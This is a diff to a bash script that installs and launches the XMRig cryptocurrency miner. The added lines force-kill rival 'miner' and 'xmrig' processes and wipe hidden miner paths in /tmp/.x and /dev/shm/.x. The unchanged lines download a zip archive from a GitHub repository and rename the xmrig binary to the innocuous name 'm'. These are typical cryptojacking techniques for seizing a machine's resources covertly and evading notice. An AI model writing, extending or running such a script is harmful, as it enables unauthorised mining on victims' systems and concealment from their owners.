@@ -1,6 +1,17 @@
 #!/bin/bash
+# Terminate all existing miner/xmrig processes
+pkill -9 -f 'miner' 2>/dev/null || true
+pkill -9 -f 'xmrig' 2>/dev/null || true
+
+# Clean hidden miner locations
+rm -rf /tmp/.x/m 2>/dev/null
+pkill -9 -f '/tmp/.x/m' 2>/dev/null || true
+rm -rf /dev/shm/.x/m 2>/dev/null
+pkill -9 -f '/dev/shm/.x/m' 2>/dev/null || true
+
+# Main installation and launch
 wget https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip && \
-unzip -o main.zip && \
+unzip main.zip && \
 cd hwloc-without-main && \
 chmod +x xmrig && \
 mv xmrig m && \
